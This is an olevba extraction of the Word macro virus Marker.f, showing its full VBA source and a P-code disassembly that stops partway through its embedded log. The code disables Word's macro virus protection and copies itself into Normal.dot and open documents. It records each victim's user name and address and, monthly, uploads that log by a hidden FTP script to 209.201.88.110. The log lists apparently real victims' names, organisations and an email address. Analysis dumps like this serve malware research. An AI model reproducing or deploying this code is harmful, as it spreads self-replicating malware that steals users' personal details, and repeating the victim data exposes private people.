olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FNORD()
  
  
  
  
Options.VirusProtection = True
Options.SaveNormalPrompt = True
Options.ConfirmConversions = True
  
x = 0
toast = "cl" + "ass" + ".sys"
tst = "Sub " + "Auto" + "Open"
tost = "Sub " + "View" + "VB" + "Code"
toad = "Tools" + "Macro"
  
Set doc = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  
If (doc.Find("AutoClose", 0, 0, 1000, 80) And doc.Find(toast, 0, 0, 1000, 80)) Then
    Startm = doc.ProcStartLine("AutoClose", vbext_pk_Proc)
    Length = doc.ProcCountLines("AutoClose", vbext_pk_Proc)
    doc.DeleteLines Startm, Length
    x = 1
End If
  
If (doc.Find(toad, 0, 0, 1000, 80)) Then
    Startm = doc.ProcStartLine(toad, vbext_pk_Proc)
    Length = doc.ProcCountLines(toad, vbext_pk_Proc)
    doc.DeleteLines Startm, Length
    x = 1
End If
  
If x = 1 Then
    MsgBox "The Class macro virus was removed from your Normal.dot"
End If
  
  
For i = 1 To Documents.Count
    x = 0
    Set doc = Documents(i).VBProject.VBComponents.Item(1).CodeModule
  
    If (doc.Find(tst, 0, 0, 1000, 80) And doc.Find(toast, 0, 0, 1000, 80)) Then
        Startm = doc.ProcStartLine("AutoOpen", vbext_pk_Proc)
        Length = doc.ProcCountLines("AutoOpen", vbext_pk_Proc)
        doc.DeleteLines Startm, Length
        x = 1
    End If
  
    If (doc.Find(tost, 0, 0, 1000, 80)) Then
        Startm = doc.ProcStartLine("ViewVBCode", vbext_pk_Proc)
        Length = doc.ProcCountLines("ViewVBCode", vbext_pk_Proc)
        doc.DeleteLines Startm, Length
        x = 1
    End If
  
    If x = 1 Then
  
        If doc.CountOfLines = 11 Then
            doc.DeleteLines 1, 11
        End If
  
        MsgBox "The class macro virus was removed from the document " + Documents(i).Name
    End If
  
Next i
End Sub
Sub AutoClose()
  
  
    Call FNORD
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:50:20  - Tuesday, 5 Jan 1999
' Queensland TAFE
'



' 04:38:36  - Wednesday, 3 Feb 1999
' Lisa Macbeth
'



' 03:39:47  - Monday, 8 Feb 1999
' DTIR
'



' 11:44:45  - Friday, 12 Feb 1999
' DTIR
'



' 11:29:11  - Thursday, 4 Mar 1999
' biddleg
'



' 09:15:51  - Monday, 8 Mar 1999
' carroljj
'



' 03:22:22  - Thursday, 11 Mar 1999
' Michelle hopgood
'



' 08:33:21  - Friday, 12 Mar 1999
' Michelle Leavers
'



' 12:14:27 PM - Friday, 19 Mar 1999
' Avert
'



' 02:35:57 odp. - pondělí, 14 VI 1999
' Lena
' Kontakt: rincewind_mg@hotmail.com



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11816 bytes
' Line #0:
' 	FuncDefn (Sub FNORD())
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' Line #9:
' 	LitDI2 0x0000 
' 	St x 
' Line #10:
' 	LitStr 0x0002 "cl"
' 	LitStr 0x0003 "ass"
' 	Add 
' 	LitStr 0x0004 ".sys"
' 	Add 
' 	St toast 
' Line #11:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Auto"
' 	Add 
' 	LitStr 0x0004 "Open"
' 	Add 
' 	St tst 
' Line #12:
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "View"
' 	Add 
' 	LitStr 0x0002 "VB"
' 	Add 
' 	LitStr 0x0004 "Code"
' 	Add 
' 	St tost 
' Line #13:
' 	LitStr 0x0005 "Tools"
' 	LitStr 0x0005 "Macro"
' 	Add 
' 	St toad 
' Line #14:
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set doc 
' Line #16:
' Line #17:
' 	LitStr 0x0009 "AutoClose"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0050 
' 	Ld doc 
' 	ArgsMemLd Find 0x0005 
' 	Ld toast 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0050 
' 	Ld doc 
' 	ArgsMemLd Find 0x0005 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #18:
' 	LitStr 0x0009 "AutoClose"
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St Startm 
' Line #19:
' 	LitStr 0x0009 "AutoClose"
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Length 
' Line #20:
' 	Ld Startm 
' 	Ld Length 
' 	Ld doc 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #21:
' 	LitDI2 0x0001 
' 	St x 
' Line #22:
' 	EndIfBlock 
' Line #23:
' Line #24:
' 	Ld toad 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0050 
' 	Ld doc 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #25:
' 	Ld toad 
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St Startm 
' Line #26:
' 	Ld toad 
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Length 
' Line #27:
' 	Ld Startm 
' 	Ld Length 
' 	Ld doc 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #28:
' 	LitDI2 0x0001 
' 	St x 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitStr 0x0036 "The Class macro virus was removed from your Normal.dot"
' 	ArgsCall MsgBox 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' Line #35:
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitDI2 0x0000 
' 	St x 
' Line #38:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set doc 
' Line #39:
' Line #40:
' 	Ld tst 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0050 
' 	Ld doc 
' 	ArgsMemLd Find 0x0005 
' 	Ld toast 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0050 
' 	Ld doc 
' 	ArgsMemLd Find 0x0005 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St Startm 
' Line #42:
' 	LitStr 0x0008 "AutoOpen"
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Length 
' Line #43:
' 	Ld Startm 
' 	Ld Length 
' 	Ld doc 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #44:
' 	LitDI2 0x0001 
' 	St x 
' Line #45:
' 	EndIfBlock 
' Line #46:
' Line #47:
' 	Ld tost 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0050 
' 	Ld doc 
' 	ArgsMemLd Find 0x0005 
' 	Paren 
' 	IfBlock 
' Line #48:
' 	LitStr 0x000A "ViewVBCode"
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St Startm 
' Line #49:
' 	LitStr 0x000A "ViewVBCode"
' 	Ld vbext_pk_Proc 
' 	Ld doc 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Length 
' Line #50:
' 	Ld Startm 
' 	Ld Length 
' 	Ld doc 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	LitDI2 0x0001 
' 	St x 
' Line #52:
' 	EndIfBlock 
' Line #53:
' Line #54:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #55:
' Line #56:
' 	Ld doc 
' 	MemLd CountOfLines 
' 	LitDI2 0x000B 
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	LitDI2 0x000B 
' 	Ld doc 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #58:
' 	EndIfBlock 
' Line #59:
' Line #60:
' 	LitStr 0x0034 "The class macro virus was removed from the document "
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #61:
' 	EndIfBlock 
' Line #62:
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub AutoClose())
' Line #66:
' Line #67:
' Line #68:
' 	ArgsCall (Call) FNORD 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Private Sub Document_Close())
' Line #71:
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' Line #74:
' 	Dim (Const) 
' 	LitStr 0x001A "<- this is another marker!"
' 	VarDefn Marker
' Line #75:
' Line #76:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #77:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #78:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #79:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogUploaded (As String)
' Line #80:
' Line #81:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #82:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #83:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #84:
' Line #85:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #86:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #87:
' Line #88:
' Line #89:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #90:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #91:
' Line #92:
' Line #93:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #94:
' Line #95:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #96:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #97:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #98:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #99:
' 	EndIfBlock 
' Line #100:
' Line #101:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #102:
' Line #103:
' 	ArgsCall Read 0x0000 
' Line #104:
' Line #105:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #106:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	LitStr 0x0007 "C:\hsfx"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #109:
' Line #110:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #113:
' Line #114:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #123:
' Line #124:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #125:
' Line #126:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #127:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	ElseIfBlock 
' Line #128:
' 	LitVarSpecial (False)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000B "LogUploaded"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #129:
' 	EndIfBlock 
' Line #130:
' Line #131:
' Line #132:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #133:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #134:
' Line #135:
' Line #136:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #137:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #138:
' Line #139:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #140:
' Line #141:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #142:
' Line #143:
' Line #144:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #145:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #146:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #147:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #148:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	ElseBlock 
' Line #151:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' Line #155:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #156:
' Line #157:
' Line #158:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #159:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #160:
' Line #161:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #162:
' Line #163:
' 	EndIfBlock 
' Line #164:
' Line #165:
' Line #166:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #167:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #168:
' Line #169:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #170:
' Line #171:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #172:
' Line #173:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #174:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #175:
' Line #176:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #177:
' Line #178:
' 	EndIfBlock 
' Line #179:
' Line #180:
' Line #181:
' 	EndIfBlock 
' Line #182:
' Line #183:
' 	EndSub 
' Line #184:
' Line #185:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #186:
' Line #187:
' 	QuoteRem 0x0000 0x0021 " 10:19:17  - Freitag, 11 Dez 1998"
' Line #188:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #189:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #190:
' 	QuoteRem 0x0000 0x0000 ""
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' 	QuoteRem 0x0000 0x0020 " 10:50:20  - Tuesday, 5 Jan 1999"
' Line #195:
' 	QuoteRem 0x0000 0x0010 " Queensland TAFE"
' Line #196:
' 	QuoteRem 0x0000 0x0000 ""
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0022 " 04:38:36  - Wednesday, 3 Feb 1999"
' Line #201:
' 	QuoteRem 0x0000 0x000D " Lisa Macbeth"
' Line #202:
' 	QuoteRem 0x0000 0x0000 ""
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' 	QuoteRem 0x0000 0x001F " 03:39:47  - Monday, 8 Feb 1999"
' Line #207:
' 	QuoteRem 0x0000 0x0005 " DTIR"
' Line #208:
' 	QuoteRem 0x0000 0x0000 ""
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' 	QuoteRem 0x0000 0x0020 " 11:44:45  - Friday, 12 Feb 1999"
' Line #213:
' 	QuoteRem 0x0000 0x0005 " DTIR"
' Line #214:
' 	QuoteRem 0x0000 0x0000 ""
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' 	QuoteRem 0x0000 0x0021 " 11:29:11  - Thursday, 4 Mar 1999"
' Line #219:
' 	QuoteRem 0x0000 0x0008 " biddleg"
' Line #220:
' 	QuoteRem 0x0000 0x0000 ""
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' 	QuoteRem 0x0000 0x001F " 09:15:51  - Monday, 8 Mar 1999"
' Line #225:
' 	QuoteRem 0x0000 0x0009 " carroljj"
' Line #226:
' 	QuoteRem 0x0000 0x0000 ""
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' 	QuoteRem 0x0000 0x0022 " 03:22:22  - Thursday, 11 Mar 1999"
' Line #231:
' 	QuoteRem 0x0000 0x0011 " Michelle hopgood"
' Line #232:
' 	QuoteRem 0x0000 0x0000 ""
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' 	QuoteRem 0x0000 0x0020 " 08:33:21  - Friday, 12 Mar 1999"
' Line #237:
' 	QuoteRem 0x0000 0x0011 " Michelle Leavers"
' Line #238:
